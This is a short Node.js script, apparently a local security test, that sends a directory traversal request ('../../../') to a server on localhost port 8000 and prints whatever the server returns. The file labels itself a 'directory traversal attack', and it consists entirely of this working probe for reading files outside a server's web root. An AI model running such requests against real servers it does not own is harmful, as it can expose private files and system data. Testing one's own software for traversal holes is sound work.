(function() {
    var http = require('http');
    var colors = require('colors');
    var content;
    var url = 'http://localhost:8000/../../../';

    console.log('\t[' + 'directory traversal attack'.green + ']: ' + url);

    var content = '';

    http.get(url, (res) => {
        res.on('data', (chunk) => {
            content += chunk.toString('utf-8');
        });
        res.on('end', () => {
            console.log('\t[' + 'directory traversal request response'.green + ']: ');
            console.log(content.toString('utf-8').red);
        });
    });
})();